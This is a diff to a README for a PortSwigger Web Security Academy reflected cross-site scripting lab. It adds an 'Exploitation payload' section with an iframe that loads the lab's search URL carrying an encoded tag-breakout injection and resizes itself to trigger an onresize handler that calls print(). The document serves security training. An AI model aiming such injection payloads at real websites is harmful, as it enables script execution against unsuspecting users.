@@ -26,3 +26,8 @@ This project documents a PortSwigger Web Security Academy lab demonstrating a re
 
 ```html
 <body onresize=print()>
+```
+## Exploitation payload
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+```
